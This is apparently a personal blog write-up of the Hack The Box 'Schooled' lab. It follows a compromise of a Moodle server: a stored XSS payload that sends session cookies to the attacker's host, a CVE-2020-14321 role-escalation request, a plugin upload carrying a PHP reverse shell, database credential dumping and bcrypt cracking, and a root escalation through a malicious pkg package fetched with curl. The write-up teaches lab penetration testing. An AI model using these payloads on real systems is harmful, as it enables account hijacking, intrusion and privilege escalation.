---
layout: single
title: "HTB - Schooled"
last_modified_at: 2021-07-05 01:00:00 -0700
categories: writeups
tags: [HTB]
share: true
date: 2021-07-05 01:00:00 -0700
toc: true
toc_label: "Table of Contents"
classes: wide
---
![TheNotebook Logo](/assets/images/writeups/htb_schooled.png){: .align-center}

**URL**: <https://app.hackthebox.eu/machines/335> \
**IP**: 10.10.10.234 \
**Completed on**: July 5, 2021 \
**Time to Complete**: 4 hours \
**OS**: FreeBSD \
**Difficulty**: Medium

## Summary
The Hack The Box machine, Schooled, allows us to explore Moodle LMS being used to manage classes. The version of Moodle being used is vulnerable to a XSS and due to an automated function to check at enrolled user's profiles, we can capture the teacher's session cookie. After this we can use a Moodle CVE to upload a reverse php shell as the `www-data` user. To privilege escalate to a user, I found the Moodle's MySQL config file, querying the Moodle database we can get a user's encrypted password. Decrypting the password we can ssh as the user. To privilege escalate to root, I used the misconfigured sudo permissions to pkg binary.

## Enumeration

### Full Port Scan
Nmap command: `nmap -p 0-65535 -T4 10.10.10.234`

Output:
```
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.043s latency).
Not shown: 44230 closed ports, 21303 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

### Version and Default Script Scan

Nmap command: `nmap -T4 -sV -sC -p 22,80,33060 10.10.10.234`

Output:
```
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.027s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

### Port 80 - Apache 2.4.46

#### Manual Interaction

Routing to <http://10.10.10.234> I got re-routed a static page.

In the footer of the page, I gathered the following information:
* Mail `admissions@schooled.htb`
* Domain `schooled.htb`

I then added `schooled.htb` into `/etc/hosts` and tried to brute force a subdomain.

#### Subdomain Brute Force

gobuster command: `sudo gobuster vhost -u http://schooled.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

Output:
`Found: moodle.schooled.htb (Status: 200) [Size: 84]`

I then added `moodle.schooled.htb` into `/etc/hosts` and proceeded to manual enumerate.

## Initial Enumeration

### Moodle enumeration

Routing to <http://moodle.schooled.htb> I was re-routed to <http://moodle.schooled.htb/moodle/>. I was able to view available course material but it is behind an authenticated function. 

Running a directory brute force did not provide any value but showed many paths that we will have access to ones authenticated.

I went ahead and logged in using guest temporary access, which showed that Mathematics was a self-assigned course but I needed to create an account.

Creating an account I was told to use email domain `@student.schooled.htb`, I went ahead and created `defender.gb@student.schooled.htb`. This provided me access to view the teacher profiles. We found the following emails from 2 teachers:
* `phillips_manuel@staff.schooled.htb`
* `higgins_jane@staff.schooled.htb`

### droopescan

To identify Moodle version, I ran droopescan:

```
droopescan scan moodle -u http://moodle.schooled.htb/moodle

[+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
    3.10.0-beta

[+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:03.823746 elapsed)
```

Moodle version 3.10.0-beta is vulnerable to various XSS issue per <https://snyk.io/vuln/composer:moodle%2Fmoodle>.

### Moodle XSS

Per the following discussion post left behind by "Manuel Phillips", he is checking all "MoodleNet" profiles before the course start date. We can edit our MoodleNet profile to a XSS oayload that will grab the cookies of anyone that routes to your profile page, we can then use the gathered authentication cookies to log in as Manuel Phillips.

Let's set our profile with the following: (Change the IP to yours)
`<script>document.location='http://10.10.16.26:8000/index.php?c='+document.cookie</script>`

Start a python server to capture the stolen cookie:
`python3 -m http.server 8000`

Now after we capture the cookie, change the stored "MoodleSession" cookie on your browser and you should now have access to the Teacher account (Manuel Phillips).

![Replacing Moodle Session cookie](/assets/images/writeups/schooled_stolencookie.png)

Now we will follow <https://github.com/HoangKien1020/CVE-2020-14321>, to grant an account "Manager" role and gives us access to create a vulnerable plugin that will grant us remote code execution (RCE).

Let's go to "Participants" and click on "Enrol users", now we get prompted to add `Lianne Carter` with student role:

![Remote Code Execution](/assets/images/writeups/schooled_rce.png)

Before clicking "Enrol user" capture the request and send it Burp repeater. (Allow all other request to go through)

Now let's route to Manuel Phillip's profile to identify that id is 24. Now change the payload to the following and send it, this will grant Manuel with Manager privileges, which will let us get access to Carter's account who is an admin of Moodle:

```
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=eNTeHUZ7Dk&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
```

Now route to Lianne's profile as click on "Log in as administrator", then route to Plugin > Install Plugin.

Let's first download Moodle RCE created by HoangKien1020:

```bash
# Kali
git clone https://github.com/HoangKien1020/Moodle_RCE.git
cd Moodle_RCE
unzip rce.zip
rm rce.zip
vim rce/lang/en/block_rce.php
# Changed code to PenTest Monkey's php reverse shell.
zip -r rce.zip rce
```

Now upload the rce.zip plugin and start a netcat listener:  (`sudo nc -nvlp 443`)

Click "Continue" twice for the remote connection to start. We should get access to `www-data` user account.

## Privilege Escalation to Jamie

### Enumerating FreeBSD

Looking at /home directory and /etc/passwd, looks like the only two accounts are `jamie` and `steve`.

There is no python, wget, or curl on the box so we will need to manually enumerate the machine.

First let's locate the moodle directory:

```
find / -name moodle 2>/dev/null 
/usr/local/www/apache24/data/moodle
/usr/local/www/apache24/data/moodle/theme/boost/scss/moodle
/usr/local/www/apache24/data/moodle/lib/editor/tinymce/tiny_mce/3.5.11/themes/advanced/skins/moodle
/var/db/mysql/moodle
```

### Database Credentials in config file

There we are able to find database credentials through the config.conf file:

```
$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);
```

### Getting credentials from moodle schema

Let's log into the sql server:
```bash
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e "SELECT @@version;"
# 8.0.23
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e "SELECT schema_name FROM information_schema.schemata;"
# Identified moodle schema
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e "use moodle; show tables"
# Identified mdl_user Which contains hashed passwords
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e "use moodle; select * from mdl_user"
# Jamie has a hash and is admin on the site.
```

Since Jamie is an account member on the box, I first identified that hash type using hashid:

```
hashid '$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW' 
Analyzing '$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

### Decrypting bcrypt password hash
Now that we know it's a bcypt hash, let's use hashcat to brute force the hash:
```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Alternative: John `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -format=bcrypt`

Let's ssh using jamie: `ssh jamie@schooled.htb` (password: !QAZ2wsx)

## Privilege Escalation to root

### Sudo privileges

Using `sudo -l` we identify that Jamie can run a few commands as root:
```
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

### Privilege escalation through pkg binary

Using GTFO bins, we are able to create our own malicious packages and install them using `sudo pkg install` command:

```bash
# Local Machine
TF=$(mktemp -d)
echo 'passwd root' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

# Remote Machine
cd /tmp
curl http://10.10.16.26:8000/x-1.0.txz -o x-1.0.txz
sudo pkg install -y --no-repo-update ./x-1.0.txz
```

Alternative use scp: `scp x-1.0.txz jamie@schooled.htb:/tmp`

Reset the password to root, and log in using `su root`.

You will now have access to `/root/` directory.